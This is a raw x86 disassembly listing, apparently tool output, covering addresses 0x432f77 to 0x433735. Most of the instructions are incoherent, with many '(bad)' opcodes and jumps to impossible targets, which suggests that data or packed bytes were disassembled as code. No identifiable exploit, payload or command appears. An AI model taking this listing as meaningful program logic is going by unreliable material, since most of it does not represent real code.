  432f77:	sub    edi,esp
  432f79:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432f7f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432f86:	inc    ebp
  432f87:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432f8d:	clc    
  432f8e:	mov    eax,edi
  432f90:	nop
  432f91:	fadd   QWORD PTR [eax]
  432f93:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432f99:	jmp    0x432f24
  432f9b:	mov    eax,DWORD PTR [ecx]
  432f9d:	fadd   DWORD PTR [eax]
  432f9f:	inc    ebp
  432fa0:	or     DWORD PTR [ebx],esi
  432fa2:	dec    eax
  432fa3:	add    edx,DWORD PTR [ebx-0x2d]
  432fa6:	dec    ebp
  432fa7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fad:	inc    ebp
  432fae:	push   ebx
  432faf:	mov    dl,BYTE PTR [ecx-0xd]
  432fb2:	xor    ecx,DWORD PTR [ebp-0x45]
  432fb5:	(bad)  
  432fb7:	rol    BYTE PTR [eax],0xc1
  432fba:	ret    
  432fbb:	inc    ebp
  432fbc:	inc    ebp
  432fbd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fc3:	xor    eax,ebx
  432fc5:	add    eax,DWORD PTR [ebp+0x23]
  432fc8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  432fce:	cmp    edi,0xc
  432fd1:	dec    ebp
  432fd2:	inc    ebp
  432fd3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  432fd9:	inc    ebp
  432fda:	mov    esi,DWORD PTR [ebx]
  432fdc:	clc    
  432fdd:	lea    eax,[ebp+0x45725407]
  432fe3:	add    BYTE PTR [ebp+eax*2-0x75],dh
  432fe7:	xor    edi,DWORD PTR [eax]
  432fe9:	mov    ecx,0xff8b8d4d
  432fee:	push   esp
  432fef:	enter  0x4df7,0x23
  432ff3:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  432ff9:	mov    eax,DWORD PTR [ebx]
  432ffb:	loopne 0x432fe8
  432ffd:	ret    0xc68b
  433000:	push   esp
  433001:	enter  0x9745,0x8b
  433005:	inc    ebp
  433006:	cld    
  433007:	mov    eax,edi
  433009:	clc    
  43300a:	ret    
  43300b:	ret    0xc645
  43300e:	mov    esi,DWORD PTR [ebx]
  433010:	cld    
  433011:	pop    esi
  433012:	mov    ebx,0x83458bc3
  433018:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43301c:	dec    ebp
  43301d:	xor    eax,0xba039c33
  433022:	mov    DWORD PTR [ebp+0x55d8f889],eax
  433028:	inc    ebp
  433029:	mov    edi,DWORD PTR [ebx]
  43302b:	adc    al,0x9c
  43302d:	inc    ebp
  43302e:	(bad)  
  43302f:	mov    ebx,eax
  433031:	adc    al,0x85
  433033:	cmp    al,0x1
  433036:	inc    ebp
  433037:	add    BYTE PTR [ecx],bh
  433039:	dec    ebp
  43303a:	pushf  
  43303b:	mov    ebp,ecx
  43303d:	mov    eax,DWORD PTR [ebx]
  43303f:	nop
  433040:	add    BYTE PTR [eax],al
  433042:	inc    ebp
  433043:	mov    esi,DWORD PTR [ebx]
  433045:	add    eax,DWORD PTR [ebx]
  433047:	cmp    al,0x89
  433049:	mov    esp,esi
  43304b:	clc    
  43304c:	inc    ebp
  43304d:	inc    ebp
  43304e:	add    edx,DWORD PTR [esi+0xc]
  433051:	mov    edi,0x7ff0845
  433056:	in     al,dx
  433057:	(bad)  
  433058:	jne    0x432ff4
  43305a:	mov    esi,DWORD PTR [edx]
  43305c:	clc    
  43305d:	add    ebp,DWORD PTR [esi]
  43305f:	mov    edi,edi
  433061:	in     al,dx
  433062:	mov    DWORD PTR [ebp-0x10],eax
  433065:	xor    eax,DWORD PTR [ebp+0x3]
  433068:	cmp    eax,0x8bf49c89
  43306d:	inc    ebp
  43306e:	fmul   DWORD PTR [ebx-0x173caf39]
  433074:	lea    ecx,[ecx+0x45e8d4bc]
  43307a:	clc    
  43307b:	mov    edi,edi
  43307d:	cmp    BYTE PTR [ebp+0x4d],al
  433080:	test   DWORD PTR [eax+0x74],ecx
  433083:	inc    ecx
  433084:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43308a:	ret    
  43308b:	inc    eax
  43308c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433092:	push   eax
  433093:	dec    eax
  433094:	test   al,0xd0
  433096:	dec    eax
  433098:	mov    eax,DWORD PTR [ebp-0x14]
  43309b:	mov    eax,DWORD PTR [ebp+0x38]
  43309e:	mov    eax,ecx
  4330a0:	fadd   DWORD PTR [ebx]
  4330a2:	dec    ebp
  4330a3:	inc    eax
  4330a4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330aa:	inc    ebp
  4330ab:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330b1:	fadd   QWORD PTR [ebx]
  4330b3:	inc    ebp
  4330b4:	or     al,0x33
  4330b6:	dec    ebp
  4330b7:	add    edi,DWORD PTR [ebx]
  4330b9:	mov    DWORD PTR [edx-0x28],esi
  4330bc:	mov    eax,DWORD PTR [ebp-0x10]
  4330bf:	mov    eax,DWORD PTR [eax+0x10]
  4330c2:	mov    eax,edi
  4330c4:	lock ret 
  4330c6:	inc    ecx
  4330c7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  4330cd:	fsubr  st,st(5)
  4330cf:	test   DWORD PTR [eax],eax
  4330d1:	clc    
  4330d2:	push   0x45
  4330d4:	(bad)  
  4330d5:	cmp    ch,ah
  4330d7:	pushf  
  4330d8:	inc    ebp
  4330d9:	(bad)  
  4330da:	push   eax
  4330db:	fsub   DWORD PTR [eax-0x7b]
  4330de:	(bad)  
  4330df:	clc    
  4330e0:	mov    eax,0xf8008584
  4330e5:	mov    eax,DWORD PTR [ebp-0x4]
  4330e8:	mov    edi,0x4585c3cc
  4330ee:	clc    
  4330ef:	mov    eax,DWORD PTR [ebp+0x14]
  4330f2:	cmp    eax,DWORD PTR [ebp-0x64]
  4330f5:	mov    edi,eax
  4330f7:	in     al,dx
  4330f8:	les    esi,FWORD PTR [ebp-0x7b]
  4330fb:	mov    edi,eax
  4330fd:	or     al,0x4d
  4330ff:	dec    ebp
  433100:	mov    eax,ebp
  433102:	in     al,0xf2
  433104:	dec    ebp
  433105:	dec    DWORD PTR [ecx+0x4dc7e045]
  43310b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433111:	inc    ebp
  433112:	mov    DWORD PTR [ebx],esi
  433114:	fadd   QWORD PTR [ebx]
  433116:	dec    ebp
  433117:	push   eax
  433118:	xor    eax,DWORD PTR [ebp+0x3]
  43311b:	push   eax
  43311c:	mov    DWORD PTR [eax+ebx*8],ebx
  43311f:	push   esi
  433121:	mov    eax,DWORD PTR [eax]
  433123:	lock cmp eax,0xf84e85c0
  433129:	inc    ebp
  43312a:	test   BYTE PTR [ebx],dh
  43312c:	add    DWORD PTR [ebx],eax
  43312e:	add    BYTE PTR [eax+0x4d],dl
  433131:	jne    0x433166
  433133:	lea    ecx,[ebx-0x7617fc44]
  433139:	div    ah
  43313b:	inc    DWORD PTR [ebp+0x45]
  43313e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433144:	jb     0x4330d1
  433146:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43314d:	mov    ecx,DWORD PTR [ebp-0x10]
  433150:	xor    ecx,DWORD PTR [ebp+0x3]
  433153:	mov    edi,DWORD PTR [ebx]
  433155:	adc    BYTE PTR [ebp+0x41],dh
  433158:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43315e:	ret    
  43315f:	push   ss
  433160:	push   0x45
  433162:	lea    ecx,[ebx+0x4de80cb0]
  433168:	sti    
  433169:	add    edi,edi
  43316b:	or     BYTE PTR [ebp+0x4d],al
  43316e:	mov    ebp,DWORD PTR [ebx]
  433170:	xor    ebp,ecx
  433172:	mov    al,BYTE PTR [edx]
  433174:	add    eax,0xc7200
  433179:	jne    0x4331c8
  43317b:	lea    esi,[ebx]
  43317d:	mov    al,0xf
  43317f:	call   0xf2844
  433184:	shl    DWORD PTR ds:0x89019c84,0x0
  43318b:	rol    BYTE PTR [ebp+0x45],1
  43318e:	mov    esi,DWORD PTR [ebx+esi*1]
  433191:	pushf  
  433192:	mov    al,bh
  433194:	add    eax,0x8572c8
  433199:	clc    
  43319a:	dec    ebp
  43319b:	inc    ebp
  43319c:	xor    edi,DWORD PTR [edx]
  43319e:	setl   al
  4331a1:	(bad)  
  4331a2:	retf   
  4331a3:	rol    cl,1
  4331a5:	dec    ebp
  4331a6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4331ac:	inc    ebp
  4331ad:	lea    ecx,[ebx-0x75b2cc38]
  4331b3:	lea    eax,ds:0x4d72c4
  4331b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4331bc:	xor    ecx,edi
  4331be:	bswap  ebx
  4331c0:	ror    BYTE PTR [ebp-0x35],0xe9
  4331c4:	rol    DWORD PTR [ecx],0x84
  4331c7:	add    BYTE PTR [ecx],al
  4331c9:	cmp    eax,DWORD PTR [eax]
  4331cb:	pushf  
  4331cc:	inc    ebp
  4331cd:	jnp    0x8a4365d0
  4331d3:	mov    eax,DWORD PTR ds:0xcf72e8
  4331d9:	lock dec ebp
  4331db:	retf   
  4331dc:	xor    ecx,DWORD PTR [ebp+0xf]
  4331df:	mov    eax,eax
  4331e1:	fmul   st,st(3)
  4331e3:	test   ecx,0x19a8484
  4331e9:	xor    al,BYTE PTR [eax]
  4331eb:	mov    DWORD PTR [ebp-0x28],eax
  4331ee:	mov    eax,DWORD PTR [ebp+0x33]
  4331f1:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4331f7:	ret    
  4331f8:	add    al,cl
  4331fa:	dec    ebp
  4331fb:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433201:	add    ecx,DWORD PTR ds:0xc7250
  433207:	inc    ebp
  433208:	rcl    DWORD PTR [eax+0x4d],0x2b
  43320c:	mov    edi,edi
  43320e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433214:	jb     0x4331dd
  433216:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43321d:	mov    esi,DWORD PTR [ebx]
  43321f:	cld    
  433220:	mov    cl,bh
  433222:	or     eax,0x372b6
  433227:	cmp    ecx,eax
  433229:	jne    0x4332a6
  43322f:	mov    eax,DWORD PTR [ebp-0x20]
  433232:	mov    eax,DWORD PTR [eax]
  433234:	xor    eax,edi
  433236:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  43323d:	mov    ecx,DWORD PTR [ebp-0x4]
  433240:	mov    ecx,edi
  433242:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433248:	jb     0x433259
  43324a:	add    BYTE PTR [edi-0x3f],dl
  43324d:	add    BYTE PTR [ebp-0x75],cl
  433250:	mov    esi,eax
  433252:	xor    eax,DWORD PTR [eax]
  433254:	mov    al,bh
  433256:	or     eax,0x4a7284
  43325b:	xor    al,cl
  43325d:	mov    ecx,DWORD PTR [ebp-0x4]
  433260:	mov    ecx,edi
  433262:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433268:	jb     0x433279
  43326a:	add    BYTE PTR [edi],dh
  43326c:	enter  0x8500,0x8b
  433270:	add    ah,bl
  433272:	add    BYTE PTR [eax],al
  433274:	inc    ebp
  433275:	(bad)  
  433276:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  43327d:	mov    esi,DWORD PTR [edx-0x4]
  433280:	add    bh,cl
  433282:	dec    ebp
  433283:	mov    dh,0x8b
  433285:	add    esi,DWORD PTR [ebx]
  433287:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43328d:	add    BYTE PTR [eax],al
  43328f:	mov    eax,ecx
  433291:	loopne 0x4332e0
  433293:	add    BYTE PTR [ebx-0x757bcc39],cl
  433299:	dec    edx
  43329a:	or     eax,0x8b7232
  43329f:	in     al,0xc1
  4332a1:	or     DWORD PTR [ebp-0x31],ecx
  4332a4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  4332ab:	xor    dh,BYTE PTR [edx-0x75]
  4332ae:	add    al,dh
  4332b0:	enter  0x4f09,0xcf
  4332b4:	inc    ebp
  4332b5:	mov    WORD PTR [ebx-0x75cdccb6],cs
  4332bb:	or     al,BYTE PTR ds:0xe4728b
  4332c1:	or     DWORD PTR [ebp-0x31],ecx
  4332c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  4332cb:	cmp    dh,BYTE PTR [edx+0xf]
  4332ce:	add    bl,dl
  4332d0:	rol    DWORD PTR [eax],0x4d
  4332d3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4332d9:	(bad)  
  4332da:	or     eax,0x4a7284
  4332df:	xor    al,cl
  4332e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4332e4:	mov    ecx,DWORD PTR [ecx]
  4332e6:	xor    ecx,edi
  4332e8:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  4332ef:	xor    cl,al
  4332f1:	mov    ecx,DWORD PTR [edi]
  4332f3:	fadd   QWORD PTR [ebp+0x9]
  4332f6:	call   0xffd02dca
  4332fb:	dec    edx
  4332fc:	dec    ebp
  4332fd:	xor    bh,BYTE PTR [ebx]
  4332ff:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433303:	loopne 0x433301
  433305:	or     edi,eax
  433307:	iret   
  433308:	ret    
  433309:	mov    WORD PTR [ebp+0x4e],es
  43330c:	mov    esi,DWORD PTR [edx]
  43330e:	call   0x8452fa4d
  433313:	(bad)  
  433314:	call   0x8bdc:0x338b3200
  43331b:	add    ah,bh
  43331d:	(bad)  
  43331e:	push   ebp
  43331f:	test   BYTE PTR [ebx],dh
  433321:	dec    edx
  433322:	add    esi,DWORD PTR [edx]
  433324:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43332a:	dec    edi
  43332c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  433333:	xor    al,BYTE PTR [ebx]
  433335:	mov    edi,DWORD PTR [ebx]
  433337:	in     al,0x75
  433339:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43333f:	dec    edx
  433340:	xor    esi,DWORD PTR [edx]
  433342:	lea    ecx,[edx]
  433344:	or     BYTE PTR [ebx+0x900f072],cl
  43334a:	ja     0x43331b
  43334c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  433353:	cmp    ch,al
  433355:	jne    0x43334a
  433357:	mov    edi,edi
  433359:	fadd   QWORD PTR [ebp+0x0]
  43335c:	mov    eax,edi
  43335e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  433365:	mov    edx,DWORD PTR [ebx]
  433367:	in     al,0x45
  433369:	or     DWORD PTR [ebx],esi
  43336b:	iret   
  43336c:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  433373:	xor    dl,BYTE PTR [eax-0x75]
  433376:	sbb    al,0xe0
  433378:	dec    DWORD PTR [ecx]
  43337a:	mov    ecx,edi
  43337c:	in     al,dx
  43337d:	mov    eax,es
  43337f:	dec    edx
  433380:	mov    DWORD PTR [edx],esi
  433382:	fmul   QWORD PTR [edx]
  433384:	jne    0x433311
  433386:	(bad)  
  433387:	(bad)  
  433389:	or     DWORD PTR [ebp-0x31],eax
  43338c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433393:	cmp    bh,bh
  433395:	jne    0x4333dc
  433397:	lea    ecx,[ebx-0x38372750]
  43339d:	inc    ebx
  43339f:	mov    eax,ecx
  4333a1:	mov    eax,0xa00c111
  4333a6:	jne    0x4333ed
  4333a8:	mov    esi,DWORD PTR [ebx]
  4333aa:	test   al,0x3
  4333ac:	inc    ebp
  4333ad:	mov    DWORD PTR [eax-0xc],edx
  4333b0:	loop   0x4333f7
  4333b2:	push   DWORD PTR [ebx]
  4333b4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333ba:	add    DWORD PTR [eax],eax
  4333bc:	mov    eax,edi
  4333be:	lods   al,BYTE PTR ds:[esi]
  4333bf:	dec    ebp
  4333c0:	inc    ebp
  4333c1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4333c7:	retf   
  4333c8:	mov    edx,ecx
  4333ca:	adc    al,0x84
  4333cc:	(bad)  
  4333cd:	std    
  4333ce:	ret    
  4333cf:	jmp    FWORD PTR [edi-0x2b7474bb]
  4333d5:	hlt    
  4333d6:	rol    edi,0x82
  4333d9:	ret    
  4333da:	cld    
  4333db:	enter  0x11ff,0x45
  4333df:	inc    ebp
  4333e0:	pop    edi
  4333e1:	mov    ebx,DWORD PTR [ebx+0x14]
  4333e4:	ret    0xc7
  4333e7:	test   BYTE PTR [ebx+0x4532519a],cl
  4333ed:	jmp    0x43337a
  4333ef:	push   0x8
  4333f1:	call   DWORD PTR [esi]
  4333f3:	in     al,dx
  4333f4:	add    BYTE PTR [ebp+0x1],0x50
  4333f8:	add    bh,ah
  4333fa:	add    bh,bh
  4333fc:	icebp  
  4333fd:	mov    ecx,DWORD PTR [eax]
  4333ff:	cld    
  433400:	pop    es
  433401:	dec    ebp
  433402:	shl    DWORD PTR [ebx],0x72
  433405:	add    eax,DWORD PTR [eax]
  433407:	cmp    edx,ecx
  433409:	je     0x43341b
  43340b:	mov    esi,DWORD PTR [ebp-0x4]
  43340e:	inc    edi
  433410:	or     al,0xc3
  433412:	jmp    FWORD PTR [edx-0x18]
  433415:	(bad)  
  433416:	sti    
  433417:	cwde   
  433418:	(bad)  
  433419:	call   0xffa12d24
  43341e:	or     al,0x45
  433420:	push   ebp
  433421:	sub    esp,0x18
  433424:	push   ebx
  433425:	inc    ebp
  433426:	mov    edi,edi
  433428:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43342f:	test   al,0x53
  433431:	inc    ebp
  433432:	push   ecx
  433433:	push   eax
  433434:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43343a:	add    ah,bh
  43343c:	(bad)  
  43343d:	dec    ebp
  43343e:	add    DWORD PTR [ebx],esi
  433440:	inc    ebp
  433441:	add    ecx,DWORD PTR [ebx+0x74943b]
  433447:	push   0xffffff8b
  433449:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43344f:	add    eax,DWORD PTR [ecx]
  433451:	or     BYTE PTR [eax],al
  433453:	call   0xff852c58
  433458:	mov    eax,DWORD PTR [ebp+0x14]
  43345b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  433461:	inc    ebp
  433462:	dec    ecx
  433463:	add    ebp,DWORD PTR [edx+0x14]
  433466:	push   0x8b3045
  43346b:	call   0x33ad81e0
  433470:	inc    DWORD PTR [ebx]
  433472:	mov    DWORD PTR [edi],ecx
  433474:	mov    eax,ecx
  433476:	or     BYTE PTR [ebp-0x3d],cl
  433479:	cmp    eax,edi
  43347b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433480:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433486:	adc    al,0xc9
  433488:	inc    ebp
  433489:	adc    BYTE PTR [eax+0x55],dl
  43348c:	jne    0x43347a
  43348e:	call   0xff54341e
  433493:	dec    ebp
  433494:	inc    ebp
  433495:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43349b:	add    BYTE PTR [ebx],bh
  43349d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334a1:	push   ebx
  4334a2:	or     al,0x51
  4334a4:	dec    ebp
  4334a5:	xor    DWORD PTR [ebx],0xf32039a
  4334ab:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ae:	mov    edi,edi
  4334b0:	pop    edi
  4334b1:	adc    BYTE PTR [ebx+0x75],bl
  4334b4:	ret    0x50
  4334b7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334bb:	(bad)  
  4334bc:	clc    
  4334bd:	mov    esp,ebp
  4334bf:	pop    ecx
  4334c0:	mov    ecx,0xf80085c2
  4334c5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4334c8:	push   esi
  4334c9:	push   esi
  4334ca:	(bad)  
  4334cb:	lock inc DWORD PTR [ebp+0x44]
  4334cf:	mov    edx,DWORD PTR [eax]
  4334d1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4334d5:	or     BYTE PTR [ebx+0x7],dl
  4334d8:	push   ecx
  4334d9:	ret    
  4334da:	xor    ebx,DWORD PTR [edx+0x37232be]
  4334e0:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4334e6:	or     al,0x80
  4334e8:	jge    0x4334eb
  4334ea:	mov    DWORD PTR [eax],eax
  4334ec:	and    al,0x8
  4334ee:	cmp    DWORD PTR [ebp+0x10],eax
  4334f1:	mov    edx,DWORD PTR [esi]
  4334f3:	xchg   esp,eax
  4334f4:	dec    esp
  4334f5:	add    BYTE PTR [eax],dl
  4334f7:	mov    ecx,edx
  4334f9:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4334fd:	dec    ebp
  4334fe:	into   
  4334ff:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433505:	mov    edx,DWORD PTR [eax+0x14]
  433508:	das    
  433509:	add    al,0x45
  43350b:	add    BYTE PTR [ebp+0x0],dh
  43350e:	mov    edi,edi
  433510:	and    al,0x50
  433512:	mov    eax,DWORD PTR [eax]
  433514:	and    al,0xd1
  433516:	xor    eax,DWORD PTR [esi]
  433518:	lea    eax,[ebp+0x8]
  43351b:	xor    esi,DWORD PTR [edx+0x3]
  43351e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433524:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43352a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433534:	cmp    bh,bh
  433536:	pushf  
  433537:	mov    edi,edi
  433539:	or     BYTE PTR [esi+ecx*1],cl
  43353c:	jne    0x433501
  43353e:	call   0xc350a
  433543:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433547:	mov    ebx,DWORD PTR [eax]
  433549:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43354d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433555:	pop    esi
  433556:	jmp    0x433521
  433558:	and    al,0x10
  43355a:	and    al,0x55
  43355c:	or     ah,ch
  43355e:	and    al,0xe4
  433560:	inc    DWORD PTR [ebx+0x35e81024]
  433566:	(bad)  
  433567:	pushf  
  433568:	dec    DWORD PTR [ecx+0x570c2444]
  43356e:	pop    esi
  43356f:	inc    ecx
  433570:	in     eax,0x89
  433572:	ret    0x24
  433575:	mov    edi,eax
  433577:	and    al,0x7d
  433579:	mov    edx,0x768089c
  43357e:	clc    
  43357f:	cli    
  433580:	call   FWORD PTR [edx+0x3893274]
  433586:	dec    DWORD PTR [ecx-0x74e7db01]
  43358c:	adc    al,0xc
  43358e:	(bad)  
  43358f:	jl     0x4335b5
  433591:	adc    al,0x8b
  433593:	dec    ebp
  433594:	or     al,0x75
  433596:	jmp    0x433523
  433598:	adc    BYTE PTR [esp+eax*2],ah
  43359b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43359f:	and    al,0x9a
  4335a1:	add    ecx,DWORD PTR [ecx+0xeca680f]
  4335a7:	dec    esp
  4335a8:	jne    0x4335b2
  4335aa:	jne    0x4335e5
  4335ac:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  4335b3:	test   BYTE PTR [ebp+0x32],bl
  4335b6:	and    al,0x85
  4335b8:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  4335be:	pop    edi
  4335bf:	(bad)  
  4335c0:	sbb    edx,DWORD PTR [eax]
  4335c2:	add    dl,dl
  4335c4:	cmp    edx,DWORD PTR [eax]
  4335c6:	add    BYTE PTR [esi+0x7e],al
  4335c9:	adc    BYTE PTR [eax],al
  4335cb:	mov    eax,ds:0x1c00107e
  4335d0:	push   edx
  4335d1:	adc    BYTE PTR [eax],al
  4335d3:	cli    
  4335d4:	push   ss
  4335d5:	adc    BYTE PTR [eax],al
  4335d7:	lahf   
  4335d8:	adc    edx,DWORD PTR [eax]
  4335da:	add    BYTE PTR [eax+eiz*2+0x10],ah
  4335de:	add    BYTE PTR [edi+0x19001004],ah
  4335e4:	inc    eax
  4335e5:	adc    BYTE PTR [eax],al
  4335e7:	ds jge 0x4335fa
  4335ea:	add    BYTE PTR [edi-0x3cffbccb],bh
  4335f0:	xor    eax,0x35c70043
  4335f5:	inc    ebx
  4335f6:	add    bl,cl
  4335f8:	xor    eax,0x35cf0043
  4335fd:	inc    ebx
  4335fe:	add    bl,dl
  433600:	xor    eax,0x35d70043
  433605:	inc    ebx
  433606:	add    bl,bl
  433608:	xor    eax,0x35df0043
  43360d:	inc    ebx
  43360e:	add    bl,ah
  433610:	xor    eax,0x35e70043
  433615:	inc    ebx
  433616:	add    BYTE PTR [ecx],ah
  433618:	jno    0x43362a
  43361a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  433621:	adc    BYTE PTR [eax],al
  433623:	ja     0x433695
  433625:	adc    BYTE PTR [eax],al
  433627:	xor    BYTE PTR [edx+0x10],0x0
  43362b:	loopne 0x43369b
  43362d:	adc    BYTE PTR [eax],al
  43362f:	cmp    BYTE PTR [eax+0x10],dl
  433632:	add    BYTE PTR ds:0x1700104f,al
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [ebx],bl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [edi],bl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [ebx],ah
  433644:	ss inc ebx
  433646:	add    BYTE PTR [edi],ah
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [ebx],ch
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [edi],ch
  433650:	ss inc ebx
  433652:	add    BYTE PTR [ebx],dh
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ecx],al
  433658:	add    BYTE PTR [eax],dl
  43365a:	add    al,ah
  43365c:	pop    ebp
  43365d:	adc    BYTE PTR [eax],al
  43365f:	add    ah,BYTE PTR ds:0x328d0010
  433665:	adc    BYTE PTR [eax],al
  433667:	xchg   DWORD PTR [ecx],edx
  433669:	adc    BYTE PTR [eax],al
  43366b:	ja     0x433679
  43366d:	adc    BYTE PTR [eax],al
  43366f:	add    cl,BYTE PTR [eax]
  433671:	adc    BYTE PTR [eax],al
  433673:	jle    0x4336e9
  433675:	adc    BYTE PTR [eax],al
  433677:	push   edi
  433678:	ss inc ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [esi+0x12],bl
  433699:	adc    BYTE PTR [eax],al
  43369b:	stc    
  43369c:	push   es
  43369d:	adc    BYTE PTR [eax],al
  43369f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4336a0:	xor    DWORD PTR [eax],edx
  4336a2:	add    BYTE PTR [eax+0x7b],dl
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	stos   DWORD PTR es:[edi],eax
  4336a8:	push   edi
  4336a9:	adc    BYTE PTR [eax],al
  4336ab:	inc    ebp
  4336ac:	adc    edx,DWORD PTR [eax]
  4336ae:	add    BYTE PTR [eax+0x38],ch
  4336b1:	adc    BYTE PTR [eax],al
  4336b3:	pop    ecx
  4336b4:	and    edx,DWORD PTR [eax]
  4336b6:	add    BYTE PTR [edi-0x64ffbcca],dl
  4336bc:	ss inc ebx
  4336be:	add    BYTE PTR [edi-0x5cffbcca],bl
  4336c4:	ss inc ebx
  4336c6:	add    BYTE PTR [edi-0x54ffbcca],ah
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [edi-0x4cffbcca],ch
  4336d4:	ss inc ebx
  4336d6:	add    BYTE PTR [ecx+0x72],cl
  4336d9:	adc    BYTE PTR [eax],al
  4336db:	cmp    edi,DWORD PTR [eax+0x10]
  4336de:	add    BYTE PTR [ebx+0x23],dl
  4336e1:	adc    BYTE PTR [eax],al
  4336e3:	jno    0x433751
  4336e5:	adc    BYTE PTR [eax],al
  4336e7:	pop    eax
  4336e8:	outs   dx,BYTE PTR ds:[esi]
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	mov    ebx,DWORD PTR [ebx+0x10]
  4336ee:	add    BYTE PTR [ebx+ebx*2],ch
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	retf   0x1066
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    BYTE PTR [ebx+0x32],al
  433719:	xor    dh,BYTE PTR ds:0x5a52345f
  43371f:	push   esp
  433720:	xor    BYTE PTR [esi],dh
  433722:	add    BYTE PTR [ecx+0x36],cl
  433725:	push   eax
  433726:	pop    edi
  433727:	ss inc ebx
  433729:	ss pop edx
  43372b:	xor    ebx,DWORD PTR [edi+0x52]
  43372e:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433732:	pop    edi
  433733:	dec    esi
  433734:	dec    esp
  433735:	dec    eax
